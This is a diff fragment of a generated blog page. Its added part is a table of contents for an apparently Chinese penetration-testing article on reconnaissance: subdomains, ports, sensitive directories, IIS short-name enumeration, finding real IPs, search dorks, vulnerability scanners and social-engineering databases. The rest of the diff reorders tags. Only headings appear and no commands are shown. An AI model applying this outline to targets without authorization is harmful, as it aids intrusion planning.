+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-网站备案号"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 网站备案号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-子域名收集"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 子域名收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-端口服务收集"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 端口服务收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-C段IP信息收集"><span class="toc-number">1.4.</span> <span class="toc-text">0x04 C段IP信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-旁站信息收集"><span class="toc-number">1.5.</span> <span class="toc-text">0x05 旁站信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x06-敏感目录-文件收集"><span class="toc-number">1.6.</span> <span class="toc-text">0x06 敏感目录&#x2F;文件收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x07-IIS短文件名枚举"><span class="toc-number">1.7.</span> <span class="toc-text">0x07 IIS短文件名枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x08-GitHub信息收集"><span class="toc-number">1.8.</span> <span class="toc-text">0x08 GitHub信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x09-网站资产信息探测"><span class="toc-number">1.9.</span> <span class="toc-text">0x09 网站资产信息探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x10-shodan、fofa、钟馗之眼信息收集"><span class="toc-number">1.10.</span> <span class="toc-text">0x10 shodan、fofa、钟馗之眼信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x11-寻找真实IP"><span class="toc-number">1.11.</span> <span class="toc-text">0x11 寻找真实IP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x12-搜索引擎语法"><span class="toc-number">1.12.</span> <span class="toc-text">0x12 搜索引擎语法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x13-爬虫分析"><span class="toc-number">1.13.</span> <span class="toc-text">0x13 爬虫分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x14-AWVS-web弱点扫描"><span class="toc-number">1.14.</span> <span class="toc-text">0x14 AWVS web弱点扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x15-Nessus-主机弱点扫描"><span class="toc-number">1.15.</span> <span class="toc-text">0x15 Nessus 主机弱点扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x16-whois信息收集、员工信息、公司名、社工库、云盘搜索"><span class="toc-number">1.16.</span> <span class="toc-text">0x16  whois信息收集、员工信息、公司名、社工库、云盘搜索</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">2.</span> <span class="toc-text">总结</span></a></li></ol>
                     </div>
                 </span>
             </div>
@@ -536,11 +588,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">CTF</a>
+                <a href="javascript:void(0)" class="js-tag color4">SQL</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">PHP</a>
+                <a href="javascript:void(0)" class="js-tag color4">CTF</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -548,19 +600,27 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">CMS</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">随笔</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">docker</a>
+                <a href="javascript:void(0)" class="js-tag color3">渗透</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">渗透</a>
+                <a href="javascript:void(0)" class="js-tag color4">PHP</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">web</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">CMS</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">docker</a>
               </li>
              
               <li class="article-tag-list-item">
